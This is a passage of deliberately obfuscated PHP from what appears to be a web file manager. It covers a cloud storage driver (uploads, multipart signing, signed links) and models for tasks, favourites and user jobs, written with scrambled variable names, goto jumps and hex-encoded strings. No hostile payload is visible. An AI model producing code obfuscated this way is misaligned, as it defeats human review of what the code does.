$Aë‚¬É‘á, $EĞ©ù“Æô¬ = false, $fÊŒš„ŒïÔ = REPEAT_REPLACE) { $CºœÚÖË—ª =& $_SERVER[îÖ]; $B°Èê†äÍ’ = array($CºœÚÖË—ª[196] => @md5_file($Aë‚¬É‘á)); $Eö–¼ôŠ¦Ğ = array($CºœÚÖË—ª[199] => get_file_mime(get_path_ext($F„µÒíä‰))); if (IO::size($Aë‚¬É‘á) <= 1024 * 1024 * 200) { $cõœõ½—óæ = $this->client->putObjectFile($Aë‚¬É‘á, $this->bucket, $F„µÒíä‰, $CºœÚÖË—ª[185], $B°Èê†äÍ’, $Eö–¼ôŠ¦Ğ); return !empty($cõœõ½—óæ) ? $this->getPathOuter($F„µÒíä‰) : !1; } $E¤‡¯ªàø = $this->client->multiUploadObject($Aë‚¬É‘á, $this->bucket, trim($F„µÒíä‰, $CºœÚÖË—ª[8]), $B°Èê†äÍ’, $Eö–¼ôŠ¦Ğ); return $E¤‡¯ªàø ? $this->getPathOuter($F„µÒíä‰) : !1; } public function download($dõ†¢šĞËè, $eÓÖÊåš…ğ) { if (!@is_dir($this->pathFather($eÓÖÊåš…ğ)) && !IO::mkdir($this->pathFather($eÓÖÊåš…ğ))) { return !1; } $aÜ¼êô°‡ = $this->client->getObject($this->bucket, $dõ†¢šĞËè, array(), $eÓÖÊåš…ğ); return $aÜ¼êô°‡ !== !1 ? $eÓÖÊåš…ğ : !1; } public function link($E˜ŞùØ³‚, $AÁÑ¬¦¬  = array()) { $CŠ×àÍ…× =& $_SERVER[îÖ]; if ($this->signVer == $CŠ×àÍ…×[200]) { return $this->client->getAuthenticatedURL($this->bucket, $E˜ŞùØ³‚, 3600 * 12, $AÁÑ¬¦¬ ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($E˜ŞùØ³‚, $CŠ×àÍ…×[8]), 3600 * 12, $this->region, array(), !0, $AÁÑ¬¦¬ ); } public function fileOut($fÇµä§ö’µ, $fêÁèùñ”„ = false, $Eí¡ƒ™Â³˜ = false, $eÍğ¡‚ã = '') { goto b„ØÀ§¦; b„ØÀ§¦: $a·Æ…ÙšÍ =& $_SERVER[îÖ]; if (!$Eí¡ƒ™Â³˜) { $Eí¡ƒ™Â³˜ = $this->pathThis($fÇµä§ö’µ); } $eœŸØèì = get_file_mime(get_path_ext($Eí¡ƒ™Â³˜)); goto EˆğëÄù”; aÅ‘›ËÈá‚: $AÍãéñ¿ƒ„ = $this->link($fÇµä§ö’µ, $cö’”÷ÕÉä); $this->fileOutLink($AÍãéñ¿ƒ„); goto fİáøÑÒ«; EˆğëÄù”: if ($eœŸØèì == $a·Æ…ÙšÍ[201]) { return parent::fileOut($fÇµä§ö’µ, $fêÁèùñ”„, $Eí¡ƒ™Â³˜, $eÍğ¡‚ã); } $fêÁèùñ”„ = $fêÁèùñ”„ ? $a·Æ…ÙšÍ[202] : $a·Æ…ÙšÍ[203]; $cö’”÷ÕÉä = array($a·Æ…ÙšÍ[204] => $fêÁèùñ”„ . $a·Æ…ÙšÍ[205] . rawurlencode($Eí¡ƒ™Â³˜), $a·Æ…ÙšÍ[206] => $eœŸØèì); goto aÅ‘›ËÈá‚; fİáøÑÒ«: } public function fileOutServer($bõŸïÈ‹¬Ç, $F“Í×‹¡Ã¡ = false, $dÒœ†íëÓ‹ = false, $bõ•ÊŠ‹Ş‡ = '') { parent::fileOut($bõŸïÈ‹¬Ç, $F“Í×‹¡Ã¡, $dÒœ†íëÓ‹, $bõ•ÊŠ‹Ş‡); } public function fileOutImage($aŞÙƒõ”ª˜, $càÓÌ‚®á = 250) { $eÃÍœ¾‡¦œ = $this->link($aŞÙƒõ”ª˜); $this->fileOutLink($eÃÍœ¾‡¦œ); } public function fileOutImageServer($d¶õ”ÇÌğ§, $b½‰­Ã¡çŸ = 250) { parent::fileOutImage($d¶õ”ÇÌğ§, $b½‰­Ã¡çŸ); } public function hashMd5($aõ©„„š÷è, $A¢Íî§ë…Í = '') { $cÛƒ¼³Ù¹ö =& $_SERVER[îÖ]; $F†Ì½£Ü· = $this->objectMeta($aõ©„„š÷è); if (!$F†Ì½£Ü·) { return !1; } $A¢Íî§ë…Í = $A¢Íî§ë…Í ? $A¢Íî§ë…Í : _get($F†Ì½£Ü·, $cÛƒ¼³Ù¹ö[207]); $A¢Íî§ë…Í = $A¢Íî§ë…Í ? $A¢Íî§ë…Í : _get($F†Ì½£Ü·, $cÛƒ¼³Ù¹ö[197], $cÛƒ¼³Ù¹ö[33]); return $A¢Íî§ë…Í; } public function uploadFormData($cœ¹§™¥²±, $c¬½¿“Ô† = 3600) { $aœ¿¾°œĞ =& $_SERVER[îÖ]; $E™ŞĞÊ¿Ô¶ = $this->pathFather($cœ¹§™¥²±); $a”÷ÈøÈ° = $this->client->getHttpUploadPostParams($this->bucket, $E™ŞĞÊ¿Ô¶, $aœ¿¾°œĞ[185], $c¬½¿“Ô†); return array_merge((array) $a”÷ÈøÈ°, array($aœ¿¾°œĞ[169] => $this->getHost())); } public function multiUploadFormData($bàÉÃÔÔ²›, $bÄŠàŸ—Ÿ = 3600) { $D…»Ç‹»é‚ =& $_SERVER[îÖ]; $DÚÚåø…àÅ = gmdate($D…»Ç‹»é‚[208]); $CŸæù¤ºâ’ = array(); $C£âãÜÛ‹õ = $this->client->getUploadId($this->bucket, $bàÉÃÔÔ²›, $CŸæù¤ºâ’); if (!$C£âãÜÛ‹õ) { return !1; } return array($D…»Ç‹»é‚[209] => $C£âãÜÛ‹õ, $D…»Ç‹»é‚[169] => $this->getHost() . $D…»Ç‹»é‚[8] . $this->pathEncode($bàÉÃÔÔ²›), $D…»Ç‹»é‚[210] => $DÚÚåø…àÅ, $D…»Ç‹»é‚[89] => $bàÉÃÔÔ²›); } public function multiUploadAuthData($eŠõÁŞ¥Ï“, $bÊŸ»”é´ç = array()) { goto cİ½­‹²ä¹; cİ½­‹²ä¹: $D‹àèÄ¹Ğ =& $_SERVER[îÖ]; $E¯“â›—Å¯ = isset($bÊŸ»”é´ç[$D‹àèÄ¹Ğ[210]]) ? $bÊŸ»”é´ç[$D‹àèÄ¹Ğ[210]] : gmdate($D‹àèÄ¹Ğ[208]); $bùÀÔãäË’ = isset($bÊŸ»”é´ç[$D‹àèÄ¹Ğ[160]]) ? $bÊŸ»”é´ç[$D‹àèÄ¹Ğ[160]] : $D‹àèÄ¹Ğ[33]; goto CÊÔæİò‘è; FÈ÷š¾´˜: if (strpos($bùÀÔãäË’, $D‹àèÄ¹Ğ[213]) === 0) { return array($D‹àèÄ¹Ğ[220] => $f¤‹…±öåô, $D‹àèÄ¹Ğ[210] => $E¯“â›—Å¯); } return $f¤‹…±öåô; goto cªÓŒùËğ; d™„‹…›Ç: $fÙîé‘¦î— = implode($D‹àèÄ¹Ğ[217], $dÒÒß½ñ‹); $DŞİÑğ = base64_encode(hash_hmac($D‹àèÄ¹Ğ[218], $fÙîé‘¦î—, $this->secret, !0)); $f¤‹…±öåô = $D‹àèÄ¹Ğ[219] . $this->accessKey . $D‹àèÄ¹Ğ[4] . $DŞİÑğ; goto FÈ÷š¾´˜; bŒÌé¬•è²: $dÒÒß½ñ‹ = array($D‹àèÄ¹Ğ[212], $D‹àèÄ¹Ğ[33], $D‹àèÄ¹Ğ[116], $D‹àèÄ¹Ğ[33], "\170\55\141\155\x7a\55\144\141\164\x65\72{$E¯“â›—Å¯}", $D‹àèÄ¹Ğ[8] . $this->bucket . $D‹àèÄ¹Ğ[8] . $this->pathEncode($bô¥ºà–´Œ) . $bùÀÔãäË’); if (strpos($bùÀÔãäË’, $D‹àèÄ¹Ğ[213]) === 0) { $dÒÒß½ñ‹[0] = $D‹àèÄ¹Ğ[214]; } if (isset($bÊŸ»”é´ç[$D‹àèÄ¹Ğ[215]]) && $bÊŸ»”é´ç[$D‹àèÄ¹Ğ[215]] == $D‹àèÄ¹Ğ[216]) { $dÒÒß½ñ‹[0] = $D‹àèÄ¹Ğ[216]; } goto d™„‹…›Ç; CÊÔæİò‘è: $bô¥ºà–´Œ = $bÊŸ»”é´ç[$D‹àèÄ¹Ğ[89]]; unset($bÊŸ»”é´ç[$D‹àèÄ¹Ğ[89]]); if (isset($bÊŸ»”é´ç[$D‹àèÄ¹Ğ[211]])) { $bÊŸ»”é´ç[$D‹àèÄ¹Ğ[210]] = $E¯“â›—Å¯; return $this->listUploadParts($bô¥ºà–´Œ, $bÊŸ»”é´ç); } goto bŒÌé¬•è²; cªÓŒùËğ: } public function listUploadParts($Fè§ëêì¤Á, $D¯“¤Âé˜› = array()) { goto AÎÎÒÒ„á°; AÎÎÒÒ„á°: $FÕ¼‰õªá =& $_SERVER[îÖ]; $d çè½Ø»õ = str_replace($FÕ¼‰õªá[221], $FÕ¼‰õªá[33], $D¯“¤Âé˜›[$FÕ¼‰õªá[160]]); $c†ˆœëãç = $this->client->listParts($this->bucket, $Fè§ëêì¤Á, $d çè½Ø»õ); goto D¤Ü«‚µª; eò“Ç¼ÕÑ‡: $F“ÉéÍ™à’ = $this->multiUploadAuthData($Fè§ëêì¤Á, $D¯“¤Âé˜›); if (empty($F“ÉéÍ™à’)) { return !1; } return array($FÕ¼‰õªá[220] => $F“ÉéÍ™à’, $FÕ¼‰õªá[210] => $D¯“¤Âé˜›[$FÕ¼‰õªá[210]], $FÕ¼‰õªá[222] => $c†ˆœëãç); goto d‘¥­äšÅ; D¤Ü«‚µª: if (!$c†ˆœëãç) { return !1; } unset($D¯“¤Âé˜›[$FÕ¼‰õªá[211]], $D¯“¤Âé˜›[$FÕ¼‰õªá[215]]); $D¯“¤Âé˜›[$FÕ¼‰õªá[89]] = $Fè§ëêì¤Á; goto eò“Ç¼ÕÑ‡; d‘¥­äšÅ: } public function getHost() { return parent::getHost() . $_SERVER[îÖ][8] . $this->bucket; } public function size($f½Û†ø¤Ô) { $b£Á„œğƒ¢ = $this->objectMeta($f½Û†ø¤Ô); return $b£Á„œğƒ¢ ? $b£Á„œğƒ¢[$_SERVER[îÖ][77]] : 0; } public function info($AÈÌ´¶´Ù) { if ($this->isFolder($AÈÌ´¶´Ù)) { return $this->folderInfo($AÈÌ´¶´Ù); } else { if ($this->isFile($AÈÌ´¶´Ù)) { return $this->fileInfo($AÈÌ´¶´Ù); } } return !1; } public function exist($F¯’¯¼£Î) { return $this->isFile($F¯’¯¼£Î) || $this->isFolder($F¯’¯¼£Î); } public function isFile($cô¦Å¹Š¤Œ) { return !$this->isFolder($cô¦Å¹Š¤Œ) && $this->objectMeta($cô¦Å¹Š¤Œ); } public function isFolder($B’÷ªÒ¼) { return $this->cacheMethod($_SERVER[îÖ][223], $B’÷ªÒ¼); } protected function objectMeta($eÏÛÇĞœâÅ) { return $this->cacheMethod($_SERVER[îÖ][224], $eÏÛÇĞœâÅ); } protected function _objectMeta($dóââ‰è·Ë) { $cÁ×ÁßÈ’î =& $_SERVER[îÖ]; $dóââ‰è·Ë = rtrim($dóââ‰è·Ë, $cÁ×ÁßÈ’î[8]); try { $eÀŠĞâÛµ® = $this->client->getObjectInfo($this->bucket, $dóââ‰è·Ë); if (!isset($eÀŠĞâÛµ®[$cÁ×ÁßÈ’î[207]]) && isset($eÀŠĞâÛµ®[$cÁ×ÁßÈ’î[225]])) { $eÀŠĞâÛµ®[$cÁ×ÁßÈ’î[207]] = $eÀŠĞâÛµ®[$cÁ×ÁßÈ’î[225]]; } } catch (Exception $E‰ğêÒÏŸá) { $eÀŠĞâÛµ® = !1; } if (!$eÀŠĞâÛµ®) { } return $eÀŠĞâÛµ®; } protected function _isFolder($FÌäˆêÁÒ) { goto d³¡—ñğÑÅ; F°³Â¿Àåİ: $cÛ±™ó÷ˆ• = $this->client->getBucket($this->bucket, $FÌäˆêÁÒ, null, 1); if (empty($cÛ±™ó÷ˆ•)) { return !1; } $cÛ±™ó÷ˆ• = array_values($cÛ±™ó÷ˆ•); goto BÀÌÁçÜõ‰; d³¡—ñğÑÅ: $F¢î•ÓÈ—ª =& $_SERVER[îÖ]; $FÌäˆêÁÒ = rtrim($FÌäˆêÁÒ, $F¢î•ÓÈ—ª[8]); if ($FÌäˆêÁÒ == $F¢î•ÓÈ—ª[33] || $FÌäˆêÁÒ == $F¢î•ÓÈ—ª[8]) { return !0; } goto F°³Â¿Àåİ; BÀÌÁçÜõ‰: if (substr($cÛ±™ó÷ˆ•[0][$F¢î•ÓÈ—ª[28]], -1) == $F¢î•ÓÈ—ª[8]) { return !0; } if (get_path_this($cÛ±™ó÷ˆ•[0][$F¢î•ÓÈ—ª[28]]) == get_path_this($FÌäˆêÁÒ)) { return !1; } return !0; goto a©œµòÌ¿ó; a©œµòÌ¿ó: } } define($_SERVER[îÖ][226], 1); goto e¨íŸÕôÛ; a†¹ï»™ø: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x74\141\x73\x6b\114\151\163\164"; public $field = array("\156\141\155\145", "\x74\171\160\x65", "\145\166\145\x6e\x74", "\164\151\155\145", "\x64\145\163\x63", "\x73\171\x73\x74\x65\x6d", "\x65\156\x61\142\154\145", "\154\x61\x73\164\122\x75\156", "\x73\x6f\162\164"); public function listData($F‘ÏÉêŠÂ­ = false, $A²‹‡‘İÁ† = "\x73\x6f\x72\x74", $c­Ìš¶¦Ó = false) { return parent::listData($F‘ÏÉêŠÂ­, $A²‹‡‘İÁ†, $c­Ìš¶¦Ó); } public function add($cßØ±•™‚œ) { $A¤ª¯š¢ =& $_SERVER[îÖ]; $D˜³ƒ Õ¥ = $this->findByName($cßØ±•™‚œ[$A¤ª¯š¢[28]]); if ($D˜³ƒ Õ¥) { return !1; } $cßØ±•™‚œ[$A¤ª¯š¢[1396]] = 0; $cßØ±•™‚œ[$A¤ª¯š¢[2120]] = $this->getSort(); return parent::insert($cßØ±•™‚œ); } private function getSort() { $BóÎÍº…£Ü =& $_SERVER[îÖ]; $E¤ÊŠ‘Æ® = parent::listData(); $dé¼ã×ÇŞİ = array_to_keyvalue($E¤ÊŠ‘Æ®, $BóÎÍº…£Ü[33], $BóÎÍº…£Ü[2120]); return empty($dé¼ã×ÇŞİ) ? 0 : max($dé¼ã×ÇŞİ) + 1; } public function update($c—‡äêÎù, $dáƒ…¥ïÙİ) { $D§½÷´™òÌ =& $_SERVER[îÖ]; $FÒ‡¢³Â‰ = $this->listData($c—‡äêÎù); $A±Å®Œ·Å = $this->findByName($dáƒ…¥ïÙİ[$D§½÷´™òÌ[28]]); if (!$FÒ‡¢³Â‰ || $A±Å®Œ·Å && $A±Å®Œ·Å[$D§½÷´™òÌ[367]] != $FÒ‡¢³Â‰[$D§½÷´™òÌ[367]]) { return !1; } return parent::update($c—‡äêÎù, $dáƒ…¥ïÙİ); } public function remove($bÜğÒá´”, $b·¸ •…Ãä = false) { $cªê¿ÓØ =& $_SERVER[îÖ]; $F…»ª©õÇ¿ = $this->listData($bÜğÒá´”); if (!$F…»ª©õÇ¿) { return; } if (!$b·¸ •…Ãä && $F…»ª©õÇ¿[$cªê¿ÓØ[1074]] == $cªê¿ÓØ[83]) { return !1; } return parent::remove($bÜğÒá´”); } public function enable($bÅ¿Ï…Ü, $D·Ÿõ‘ĞĞÄ) { return $this->update($bÅ¿Ï…Ü, array($_SERVER[îÖ][2472] => $D·Ÿõ‘ĞĞÄ)); } public function run($bØ’¡õ¥ĞÌ) { return $this->update($bØ’¡õ¥ĞÌ, array($_SERVER[îÖ][2483] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($DˆùÊ‚•òĞ) { $cÍ‰ôŞÂ¾ö =& $_SERVER[îÖ]; return array($cÍ‰ôŞÂ¾ö[2484] => array(USER_ID, $cÍ‰ôŞÂ¾ö[2485])); } protected function listData() { $fÕ’èÂ¯ëâ =& $_SERVER[îÖ]; $c¨†ø´†¿Í = array($fÕ’èÂ¯ëâ[1422] => USER_ID, $fÕ’èÂ¯ëâ[436] => 0); $A±º‰÷ÂéÚ = $fÕ’èÂ¯ëâ[2486]; $c¹ö£Æ¶ = $this->field($A±º‰÷ÂéÚ)->where($c¨†ø´†¿Í)->order($fÕ’èÂ¯ëâ[2487])->select(); return $c¹ö£Æ¶ ? $c¹ö£Æ¶ : array(); } protected function resetCache() { } protected function listView() { goto Eø¤‹Çè¦„; b¼¹“é–Ù: $cØ°¤•ÙŠù = array_to_keyvalue($cØ°¤•ÙŠù, $Bã‡ÃÅë¡ó[369]); foreach ($Fä¦©Ûå‘  as $BÎ‚•æ™ÑÌ => $B…©÷Á®„ï) { $eÒ¬Öäî³ß = $cØ°¤•ÙŠù[$B…©÷Á®„ï[$Bã‡ÃÅë¡ó[75]]]; $eÒ¬Öäî³ß = $eÒ¬Öäî³ß ? $eÒ¬Öäî³ß : array(); $Fä¦©Ûå‘ [$BÎ‚•æ™ÑÌ] = array_merge($eÒ¬Öäî³ß, $B…©÷Á®„ï); } return $Fä¦©Ûå‘ ; goto CËˆø†Ö²è; Eø¤‹Çè¦„: $Bã‡ÃÅë¡ó =& $_SERVER[îÖ]; $Fä¦©Ûå‘  = $this->listData(); $D¹Í‰™Ñ‡¦ = array_filter_by_field($Fä¦©Ûå‘ , $Bã‡ÃÅë¡ó[29], $Bã‡ÃÅë¡ó[382]); goto bˆ½¾‚éèø; bˆ½¾‚éèø: $déíÓô—î‘ = array_to_keyvalue($D¹Í‰™Ñ‡¦, $Bã‡ÃÅë¡ó[33], $Bã‡ÃÅë¡ó[75]); if (!$déíÓô—î‘) { return $Fä¦©Ûå‘ ; } $eŠøš†£·” = 2000; goto eá±å´á½; eá±å´á½: $F¬¶¥³•ë° = array($Bã‡ÃÅë¡ó[383] => array($Bã‡ÃÅë¡ó[384], $déíÓô—î‘)); $cØ°¤•ÙŠù = Model($Bã‡ÃÅë¡ó[752])->listSource($F¬¶¥³•ë°, $eŠøš†£·”); $cØ°¤•ÙŠù = array_merge($cØ°¤•ÙŠù[$Bã‡ÃÅë¡ó[73]], $cØ°¤•ÙŠù[$Bã‡ÃÅë¡ó[74]]); goto b¼¹“é–Ù; CËˆø†Ö²è: } protected function addFav($ašÆíÏ¯, $Bâ‰ªªÑç = '', $A¥”ÍâŸ†› = "\x73\x6f\165\x72\x63\145") { goto BòŒˆº´æ; F‘‡ˆ’åöÃ: return $this->add($c«¿Ê‘ˆ´Ò); goto d½˜©Œ¤Ç; BËÌøŞà‘: if (!$Bâ‰ªªÑç && $A¥”ÍâŸ†› == $Cˆï‹°š†§[382]) { $a‚ÁÏƒ¨ = Model($Cˆï‹°š†§[1111])->where(array($Cˆï‹°š†§[383] => $ašÆíÏ¯))->find(); if (!$a‚ÁÏƒ¨) { return !1; } $Bâ‰ªªÑç = $a‚ÁÏƒ¨[$Cˆï‹°š†§[28]]; } $Bâ‰ªªÑç = $this->getAutoName($Bâ‰ªªÑç); $c«¿Ê‘ˆ´Ò = array($Cˆï‹°š†§[1422] => USER_ID, $Cˆï‹°š†§[436] => 0, $Cˆï‹°š†§[386] => $Bâ‰ªªÑç, $Cˆï‹°š†§[387] => $ašÆíÏ¯, $Cˆï‹°š†§[388] => $A¥”ÍâŸ†›, $Cˆï‹°š†§[2103] => $DéÒç¸Ëâª + 1); goto F‘‡ˆ’åöÃ; a‹Ï¶Òõíì: $eëµ³„¦ÖŸ = array($Cˆï‹°š†§[1422] => USER_ID, $Cˆï‹°š†§[436] => 0); $DéÒç¸Ëâª = $this->where($eëµ³„¦ÖŸ)->max($Cˆï‹°š†§[2120]); if (!$DéÒç¸Ëâª) { $DéÒç¸Ëâª = 0; } goto BËÌøŞà‘; BòŒˆº´æ: $Cˆï‹°š†§ =& $_SERVER[îÖ]; $eëµ³„¦ÖŸ = array($Cˆï‹°š†§[1422] => USER_ID, $Cˆï‹°š†§[436] => 0, $Cˆï‹°š†§[388] => $A¥”ÍâŸ†›, $Cˆï‹°š†§[387] => $ašÆíÏ¯); if ($this->where($eëµ³„¦ÖŸ)->find()) { return !1; } goto a‹Ï¶Òõíì; d½˜©Œ¤Ç: } protected function remove($C°ĞöÄƒÇ) { $bŠµŠÆ¸ñ» =& $_SERVER[îÖ]; $A»­â¥È = array($bŠµŠÆ¸ñ»[1422] => USER_ID, $bŠµŠÆ¸ñ»[385] => $C°ĞöÄƒÇ); return $this->where($A»­â¥È)->delete(); } protected function removeByName($Aå¿ÏÊñ§) { $CöµÒÈØßò =& $_SERVER[îÖ]; $fÛ§­•ß®Ù = array($CöµÒÈØßò[1422] => USER_ID, $CöµÒÈØßò[386] => $Aå¿ÏÊñ§, $CöµÒÈØßò[436] => 0); return $this->where($fÛ§­•ß®Ù)->delete(); } protected function rename($f­ªØğĞ–“, $eå¸å˜ßà‡) { $fçÚ¸àçÌ§ =& $_SERVER[îÖ]; if ($f­ªØğĞ–“ == $eå¸å˜ßà‡) { return !1; } $C¨¢ÏÅ¦× = $this->getAutoName($eå¸å˜ßà‡); if ($eå¸å˜ßà‡ != $C¨¢ÏÅ¦×) { return !1; } $a‚§›ßãƒ = array($fçÚ¸àçÌ§[1422] => USER_ID, $fçÚ¸àçÌ§[436] => 0, $fçÚ¸àçÌ§[28] => $f­ªØğĞ–“); return $this->where($a‚§›ßãƒ)->save(array($fçÚ¸àçÌ§[28] => $eå¸å˜ßà‡)); } protected function resetSort($FŞ¹š÷Œ¢¨) { $CĞ²’§º¿Ê =& $_SERVER[îÖ]; $FŞ¹š÷Œ¢¨ = is_array($FŞ¹š÷Œ¢¨) ? $FŞ¹š÷Œ¢¨ : array(); $B±øÀè£«Ñ = array($CĞ²’§º¿Ê[1422] => USER_ID); for ($AåŞİ³×– = 0; $AåŞİ³×– < count($FŞ¹š÷Œ¢¨); $AåŞİ³×–++) { $B±øÀè£«Ñ[$CĞ²’§º¿Ê[385]] = $FŞ¹š÷Œ¢¨[$AåŞİ³×–]; $this->where($B±øÀè£«Ñ)->save(array($CĞ²’§º¿Ê[2103] => $AåŞİ³×– + 1)); } return !0; } protected function moveTop($DâŒº½Ö§) { goto a±éÆ…š–¿; FÂ Ñ²ÊÛ: if (!$Fè¶ƒ»ÂŠ±) { return; } $fŞĞ£Òìî­ = $this->field($Aùî¤„¹½[367])->where($A·ÜÛ’«‹†)->order($Aùî¤„¹½[2487])->select(); $fŞĞ£Òìî­ = array_to_keyvalue($fŞĞ£Òìî­, $Aùî¤„¹½[33], $Aùî¤„¹½[367]); goto cØãîÑŠ˜Ó; c«ô„¬Ëèâ: return $this->resetSort($fŞĞ£Òìî­); goto F¸ïÒÀç®; a±éÆ…š–¿: $Aùî¤„¹½ =& $_SERVER[îÖ]; $A·ÜÛ’«‹† = array($Aùî¤„¹½[1422] => USER_ID, $Aùî¤„¹½[436] => 0); $Fè¶ƒ»ÂŠ± = $this->where($A·ÜÛ’«‹†)->where(array($Aùî¤„¹½[28] => $DâŒº½Ö§))->find(); goto FÂ Ñ²ÊÛ; cØãîÑŠ˜Ó: $E”»×ÌÇ…õ = $fŞĞ£Òìî­; $fŞĞ£Òìî­ = array_remove_value($fŞĞ£Òìî­, $Fè¶ƒ»ÂŠ±[$Aùî¤„¹½[367]]); array_unshift($fŞĞ£Òìî­, $Fè¶ƒ»ÂŠ±[$Aùî¤„¹½[367]]); goto c«ô„¬Ëèâ; F¸ïÒÀç®: } protected function moveBottom($e‘‘Şäí†) { $d®ØŞãùŒ =& $_SERVER[îÖ]; $eÎç£«Úê½ = array($d®ØŞãùŒ[1422] => USER_ID, $d®ØŞãùŒ[436] => 0); $b˜æŠˆ®ÑÆ = $this->where($eÎç£«Úê½)->max($d®ØŞãùŒ[2120]); $AÅÉÄ— †ª = array($d®ØŞãùŒ[2120] => $b˜æŠˆ®ÑÆ + 1); return $this->where($eÎç£«Úê½)->where(array($d®ØŞãùŒ[28] => $e‘‘Şäí†))->save($AÅÉÄ— †ª); } private function getAutoName($A‹çÒµ¹ø) { goto F°ÂœêÅˆ; A‚£ñçËÌ˜: return $A‹çÒµ¹ø . "\x28{$FÎ–îÄÚ¸}\x29"; goto eİë„ÍäĞ‰; F°ÂœêÅˆ: $D÷µ—’æ² =& $_SERVER[îÖ]; $dÑÉø­òÑ­ = array($D÷µ—’æ²[1422] => USER_ID, $D÷µ—’æ²[436] => 0); $Eàã²¯„™ï = $this->field($D÷µ—’æ²[28])->where($dÑÉø­òÑ­)->select(); goto c©í¡§ø“ç; c©í¡§ø“ç: $Eàã²¯„™ï = array_to_keyvalue($Eàã²¯„™ï, $D÷µ—’æ²[33], $D÷µ—’æ²[28]); if (!$Eàã²¯„™ï || !in_array($A‹çÒµ¹ø, $Eàã²¯„™ï)) { return $A‹çÒµ¹ø; } for ($FÎ–îÄÚ¸ = 0; $FÎ–îÄÚ¸ < count($Eàã²¯„™ï); $FÎ–îÄÚ¸++) { if (!in_array($A‹çÒµ¹ø . "\50{$FÎ–îÄÚ¸}\51", $Eàã²¯„™ï)) { return $A‹çÒµ¹ø . "\x28{$FÎ–îÄÚ¸}\x29"; } } goto A‚£ñçËÌ˜; eİë„ÍäĞ‰: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x6a\157\142\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\144\145\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\145\154\146\x4a\157\142\x4c\151\x73\164"; public function listData($aˆ‰Œœñ“Î = false, $b–¼¡ˆ†š‘ = "\x73\157\x72\x74", $A”®¸¢ÂŒ = false) { return parent::listData($aˆ‰Œœñ“Î, $b–¼¡ˆ†š‘, $A”®¸¢ÂŒ); } public function remove($F§ê±»£§) { return parent::remove($F§ê±»£§); } public function add($B¡ğ‡ãƒù) { $F‹…™‚Ê¥Ö =& $_SERVER[îÖ]; if ($this->findByName($B¡ğ‡ãƒù[$F‹…™‚Ê¥Ö[28]])) { return !1; } $B¡ğ‡ãƒù[$F‹…™‚Ê¥Ö[2120]] = $this->getSort(); return parent::insert($B¡ğ‡ãƒù); } private function getSort() { $f…³šˆ° =& $_SERVER[îÖ]; $b¯¾½—¹ë = parent::listData(); $AÏƒ«ÉÃÍ¬ = array_to_keyvalue($b¯¾½—¹ë, $f…³šˆ°[33], $f…³šˆ°[2120]); return empty($AÏƒ«ÉÃÍ¬) ? 0 : max($AÏƒ«ÉÃÍ¬) + 1; } public function update($F˜®™ÁÉªß, $c‚ñÆä™) { $c¤•„½±î =& $_SERVER[îÖ]; $eï¦ãÓïÊß = parent::listData($F˜®™ÁÉªß); $CÍšõî•Ñ = $this->findByName($c‚ñÆä™[$c¤•„½±î[28]]); if (!$eï¦ãÓïÊß || $CÍšõî•Ñ && $CÍšõî•Ñ[$c¤•„½±î[367]] != $eï¦ãÓïÊß[$c¤•„½±î[367]]) { return !1; } return parent::update($F˜®™ÁÉªß, $c‚ñÆä™); } public function setUserJob($bóÏğ”Ó, $Aòá‡•¤º„) { goto Ağùµ®Î; F–†å¢ÅÇ»: $Bé¶àÛÍëˆ = rtrim($Bé¶àÛÍëˆ, $e±Î¿ê‚”˜[47]); Model($e±Î¿ê‚”˜[477])->metaSet($bóÏğ”Ó, self::JOB_KEY, $Bé¶àÛÍëˆ); goto E™‘à‰¾¥º; Fëõí†´áÜ: $a‘‰ï½‚İ¨ = array_to_keyvalue($B­Ã §ˆä, $e±Î¿ê‚”˜[28]); $Bé¶àÛÍëˆ = $e±Î¿ê‚”˜[361]; foreach ($Aòá‡•¤º„ as $c•õîÛ¹ Á) { if ($a‘‰ï½‚İ¨[$c•õîÛ¹ Á]) { $Bé¶àÛÍëˆ .= $a‘‰ï½‚İ¨[$c•õîÛ¹ Á][$e±Î¿ê‚”˜[367]] . $e±Î¿ê‚”˜[47]; } else { $DÈÀ¼Óƒ = $this->add($c•õîÛ¹ Á); $Bé¶àÛÍëˆ .= $DÈÀ¼Óƒ . $e±Î¿ê‚”˜[47]; } } goto F–†å¢ÅÇ»; Ağùµ®Î: $e±Î¿ê‚”˜ =& $_SERVER[îÖ]; if (!is_array($Aòá‡•¤º„)) { $Aòá‡•¤º„ = array($Aòá‡•¤º„); } $B­Ã §ˆä = parent::listData(); goto Fëõí†´áÜ; E™‘à‰¾¥º: } public function getUserJob($c£Óå‘­å­) { $dàŞ…åÃÖÇ = Model($_SERVER[îÖ][477])->metaGet($c£Óå‘­å­); return $this->getUserJobInfo($dàŞ…åÃÖÇ[self::JOB_KEY]); } public function getUserJobInfo($B¼•ËÙÚø´) { goto fÂ‰â‹ƒ™; fÂ‰â‹ƒ™: $C¸…†Æ¾«™ =& $_SERVER[îÖ]; $eîµ¿¢¬á‰ = explode($C¸…†Æ¾«™[47], $B¼•ËÙÚø´); $DŸ±–ƒŒƒÌ = parent::listData(); goto EŒÉ££“ÓÒ; EŒÉ££“ÓÒ: $DŸ±–ƒŒƒÌ = array_remove_key($DŸ±–ƒŒƒÌ, $C¸…†Æ¾«™[187]); $A”†²µ¥ŸĞ = array(); foreach ($eîµ¿¢¬á‰ as $DÆ‘óå°‰Ú) { if (isset($DŸ±–ƒŒƒÌ[$DÆ‘óå°‰Ú])) { $A”†²µ¥ŸĞ[] = $DŸ±–ƒŒƒÌ[$DÆ‘óå°‰Ú]; } } goto DÖÖ‰æÇ‡; DÖÖ‰æÇ‡: return $A”†²µ¥ŸĞ; goto FÅÉ–²·Çİ; FÅÉ–²·Çİ: } } goto c†Èñ¾’Çº; f§°¬ë÷µ: $DÔ×¹×‰‹‘ = $_SERVER[îÖ][550]; class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\x6e\x64\145\170"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($BÌÁƒ¼„ßï) { goto fŠÂãöÛÃÅ; D­ó–‚ï–È: 